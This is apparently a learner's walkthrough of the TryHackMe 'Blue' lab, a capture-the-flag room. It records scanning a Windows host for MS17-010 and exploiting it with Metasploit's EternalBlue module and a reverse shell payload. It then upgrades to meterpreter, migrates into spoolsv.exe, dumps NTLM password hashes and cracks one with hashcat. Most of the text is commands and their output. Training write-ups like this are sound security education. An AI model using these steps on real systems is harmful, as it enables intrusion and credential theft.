# Blue

Notes on tryhackme ctf.

A number of unnecessary steps were added for learning. 
Actually gaining system level access is a short task.

## recon

### nmap

`└─# nmap -sV -vv --script vuln 10.10.204.243`

```
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 128 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped   syn-ack ttl 128
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49167/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 02:A4:76:B3:B3:A3 (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 00:07
Completed NSE at 00:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.28 seconds
           Raw packets sent: 1091 (47.988KB) | Rcvd: 1001 (40.064KB)
```


Vulnerable to Eternal Blue.


## initial access

### Metasploit

`msf6 > use exploit/windows/smb/ms17_010_eternalblue`

`msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp` (for learning).

`msf6 exploit(windows/smb/ms17_010_eternalblue) > run`

### converting shell to meterpreter

https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646

- ctrl+z
- `use post/multi/manage/shell_to_meterpreter`
- `set session 1`
Opens meterpreter session 2
- `sessions -i 2`



## escalation

This section is mostly just playing around with meterpreter and not actually necessary for this challenge (we already have system level access).

`C:\Windows\system32>whoami`

```
nt authority\system
```

`meterpreter > ps`

```
PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 724   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1000  644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 1064  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1168  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1296  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1332  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1392  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1468  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1488  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\wmiprvse.exe
 1624  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1820  724   WMIADAP.exe           x64   0        NT AUTHORITY\SYSTEM           \\?\C:\Windows\system32\wbem\WMIADAP.EXE
 1888  724   taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe
 1940  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2084  816   WmiPrvSE.exe
 2120  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 2184  3036  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 2348  692   mscorsvw.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe
 2360  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2396  692   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
 2440  1296  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2448  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2508  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2636  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2656  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2672  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2820  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 3068  2348  mscorsvw.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe
```

`meterpreter > migrate 1296` should attatch our shell to the spoolsv.exe service. This will hopefully make our shell more stable.

### hashdump

`meterpreter > hashdump`

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

`└─# echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > hash`

`└─# hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt`

```
ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
```

## capturing the flags

`meterpreter > search -f *flag*`
